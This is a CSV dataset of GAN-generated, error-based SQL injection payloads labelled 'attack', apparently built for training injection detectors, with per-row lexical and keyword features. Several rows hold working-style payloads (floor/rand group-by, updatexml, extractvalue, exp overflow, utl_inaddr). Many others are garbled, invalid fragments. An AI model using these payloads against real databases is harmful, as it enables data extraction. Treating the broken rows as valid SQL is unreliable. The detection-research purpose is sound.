label,payload,family,payload_type,method,run_id,sample_index,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,keyword_total
attack,1'i,error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1225,3.0,3.0,1.584962500721156,1.0,1.0,0.0,1.0,0.3333333333333333,0.3333333333333333,0.0,0.3333333333333333,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1'  =  'owlp""  =  ""owy""  =  ""uquuql'  =  ''  =  'wu'  =  'jwv'  =  'wuhuqhuo' like 'llexV' like 'wv",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1226,99.0,20.0,3.4587490409608503,41.0,1.0,32.0,25.0,0.41414141414141414,0.010101010101010102,0.32323232323232326,0.25252525252525254,14.0,4.0,0.0,0.0,0.0,7.0,0.0,0.0,0.0,0.0,0.0,7.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1%'   )    )    or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (   '%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1227,291.0,38.0,3.841205619669931,99.0,35.0,117.0,40.0,0.3402061855670103,0.12027491408934708,0.4020618556701031,0.13745704467353953,2.0,2.0,0.0,0.0,2.0,2.0,0.0,22.0,2.0,2.0,5.0,4.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0
attack,"-3362' where uhlzb""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1228,25.0,16.0,3.7034651896016473,10.0,4.0,6.0,5.0,0.4,0.16,0.24,0.2,1.0,2.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,"1'  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  'iwkr""  =  ""xw' where 1592  =  1592 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a   )    )   +'z"" like ""ej'  =  'vbj",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1229,583.0,44.0,4.085025845955211,217.0,77.0,214.0,75.0,0.37221269296740994,0.1320754716981132,0.3670668953687822,0.12864493996569468,6.0,4.0,0.0,0.0,4.0,5.0,0.0,39.0,0.0,4.0,10.0,10.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,0.0,1.0,4.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,18.0
attack,"-9176ubu' where 6765  =  6765 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666   )    )   ||'' like 'l",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1230,185.0,35.0,3.9709059879109416,46.0,50.0,63.0,26.0,0.24864864864864866,0.2702702702702703,0.34054054054054056,0.14054054054054055,4.0,0.0,1.0,0.0,0.0,2.0,0.0,11.0,0.0,0.0,6.0,5.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1'+  (  select bruk where 1400  =  1400 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1   )    )   +'",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1231,234.0,33.0,3.9188780898706512,81.0,45.0,83.0,25.0,0.34615384615384615,0.19230769230769232,0.3547008547008547,0.10683760683760683,2.0,0.0,0.0,0.0,0.0,2.0,0.0,14.0,0.0,0.0,5.0,4.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,2.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1%'  )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and   (  '%'  =  '""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1232,355.0,34.0,3.582239920982937,92.0,45.0,152.0,66.0,0.2591549295774648,0.1267605633802817,0.428169014084507,0.18591549295774648,4.0,2.0,0.0,0.0,0.0,4.0,0.0,30.0,2.0,3.0,0.0,24.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,1'  )   )   )   FROM   )    (  c1   (  case when   (  select count  )  --,error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1233,73.0,21.0,3.0599365036947637,24.0,2.0,36.0,11.0,0.3287671232876712,0.0273972602739726,0.4931506849315068,0.1506849315068493,1.0,0.0,2.0,0.0,0.0,0.0,0.0,8.0,0.0,0.0,0.0,2.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,1')   )    AND 'i'  )  # )    )      )    )     )  case c or else 0 end   )   --,error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1234,80.0,20.0,2.641708071762617,18.0,2.0,45.0,15.0,0.225,0.025,0.5625,0.1875,3.0,0.0,2.0,0.0,0.0,0.0,0.0,9.0,0.0,0.0,0.0,2.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,-1272' or 5305 ) or bll_iuhkyuzu,error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1235,32.0,21.0,4.1761085007312415,15.0,8.0,5.0,4.0,0.46875,0.25,0.15625,0.125,1.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"1%'   )    )     )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (     (  '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1236,340.0,38.0,3.7902846768717664,101.0,55.0,141.0,43.0,0.29705882352941176,0.16176470588235295,0.4147058823529412,0.1264705882352941,4.0,0.0,0.0,0.0,2.0,2.0,0.0,26.0,2.0,0.0,6.0,5.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,13.0
attack,1%k%'  =  ',error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1237,11.0,6.0,2.3685225277282065,1.0,1.0,4.0,5.0,0.09090909090909091,0.09090909090909091,0.36363636363636365,0.45454545454545453,2.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,2.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1%""   )    )     )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1238,220.0,30.0,3.301190307420209,47.0,32.0,107.0,34.0,0.21363636363636362,0.14545454545454545,0.4863636363636364,0.15454545454545454,2.0,2.0,0.0,0.0,1.0,2.0,0.0,20.0,2.0,0.0,4.0,3.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
attack,1' and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and 'jdrbq,error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1239,334.0,35.0,3.6499159958807446,97.0,45.0,136.0,56.0,0.2904191616766467,0.1347305389221557,0.40718562874251496,0.16766467065868262,2.0,0.0,0.0,0.0,0.0,2.0,0.0,28.0,0.0,3.0,0.0,22.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1'+  (  select pdfv where 1172  =  1172 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161   )    )   +'",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1240,186.0,32.0,3.8616659663884896,49.0,47.0,66.0,24.0,0.26344086021505375,0.25268817204301075,0.3548387096774194,0.12903225806451613,2.0,0.0,0.0,0.0,0.0,2.0,0.0,12.0,0.0,0.0,6.0,4.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,2.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
attack,"1'   )    )    and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (   'ldlj",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1241,174.0,27.0,3.5486157039824535,41.0,39.0,71.0,23.0,0.23563218390804597,0.22413793103448276,0.40804597701149425,0.13218390804597702,2.0,0.0,0.0,0.0,0.0,1.0,0.0,14.0,0.0,0.0,6.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,1  )   prou all where fow  as  )  --,error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1242,36.0,15.0,3.244842531753244,17.0,1.0,14.0,4.0,0.4722222222222222,0.027777777777777776,0.3888888888888889,0.1111111111111111,0.0,0.0,2.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,"1' and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'jujrv",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1243,182.0,31.0,3.6488599665926156,52.0,32.0,75.0,23.0,0.2857142857142857,0.17582417582417584,0.41208791208791207,0.12637362637362637,2.0,0.0,0.0,0.0,1.0,1.0,0.0,14.0,0.0,0.0,4.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
attack,1  )   a( dl    )   then mi 3785 d  =  )   then 1 echrocerosts  (  =    ctr,error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1244,75.0,22.0,3.3556912778627765,29.0,6.0,33.0,7.0,0.38666666666666666,0.08,0.44,0.09333333333333334,0.0,0.0,0.0,0.0,0.0,2.0,0.0,5.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,1  )   as roueu,error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1245,15.0,9.0,2.739572261986723,7.0,1.0,6.0,1.0,0.4666666666666667,0.06666666666666667,0.4,0.06666666666666667,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1'||  (  select 'zv'  =  'u'  =  'owv""  =  ""kdh'  =  '5584Mejvyj'  =  'v'  =  'u'  =  'ou",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1246,89.0,26.0,3.476528551119593,25.0,5.0,33.0,26.0,0.2808988764044944,0.056179775280898875,0.3707865168539326,0.29213483146067415,14.0,2.0,0.0,0.0,0.0,7.0,0.0,1.0,0.0,0.0,0.0,9.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,"1""  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  ""njjdmu"" like ""ribksxtx.group5840S DISTIT concat  (  select   (  case when   (  select * rocithssx.perost_hetss from  (   )   )    )   (  case when   (  select whenx  (  --",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1247,439.0,47.0,4.188643127035822,198.0,39.0,151.0,51.0,0.4510250569476082,0.0888382687927107,0.3439635535307517,0.11617312072892938,0.0,4.0,2.0,0.0,3.0,1.0,0.0,30.0,0.0,3.0,5.0,6.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,0.0,0.0,3.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,14.0
attack,1' andchre where 1392  =  6270 from roac,error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1248,40.0,21.0,3.9898227820087557,20.0,9.0,9.0,2.0,0.5,0.225,0.225,0.05,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"1%""   )    )     )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  ""k""  =  ""dinformation_schemap'  =  'y'  =  'i""  =  ""owx%' from dual where 8294  =  8294 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a   )    )   ||'""   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  """,error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1249,850.0,44.0,3.8956757334219505,281.0,108.0,345.0,116.0,0.3305882352941176,0.12705882352941175,0.40588235294117647,0.13647058823529412,6.0,8.0,0.0,0.0,5.0,8.0,0.0,63.0,2.0,5.0,14.0,15.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,9.0,0.0,1.0,6.0,4.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,26.0
attack,"-'  )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and   (  '""   )    AND rous akxws   (    (   or select FROM WHERE LIMIT FROM al  )  R,0x717a767a71,floor  (  rand  122  ),*",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1250,420.0,53.0,4.183692962466081,154.0,66.0,154.0,46.0,0.36666666666666664,0.15714285714285714,0.36666666666666664,0.10952380952380952,2.0,1.0,1.0,0.0,3.0,1.0,0.0,28.0,0.0,0.0,9.0,6.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,7.0,3.0,1.0,3.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,19.0
attack,"1'   )    )     )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (     (  'eju'  =  'eu'  =  'eu'  =  'j' where 4244  =  4244 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1   )    )   +'",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1251,577.0,42.0,3.926757181204812,181.0,99.0,227.0,70.0,0.31369150779896016,0.17157712305025996,0.3934142114384749,0.12131715771230503,10.0,0.0,0.0,0.0,2.0,6.0,0.0,39.0,0.0,0.0,11.0,10.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,7.0,3.0,1.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,16.0
attack," AND 1 group by concat  (  =  6270,1   )    )     )   then 1 group by concat  (  =0x78   ||ca a moe  )  )   FROM   (   ,concat  (  6270,1   )   ||  (  S when   (  )  #",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1252,167.0,37.0,3.694716873722375,55.0,15.0,74.0,23.0,0.32934131736526945,0.08982035928143713,0.4431137724550898,0.1377245508982036,0.0,0.0,0.0,0.0,0.0,2.0,0.0,13.0,0.0,0.0,3.0,6.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
attack,"  (  =  case or 1 group --zypu"" like ""hjbyj'  =  'ul",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1253,52.0,24.0,3.955153420022564,26.0,1.0,16.0,9.0,0.5,0.019230769230769232,0.3076923076923077,0.17307692307692307,2.0,2.0,2.0,0.0,0.0,2.0,0.0,1.0,0.0,0.0,0.0,4.0,1.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
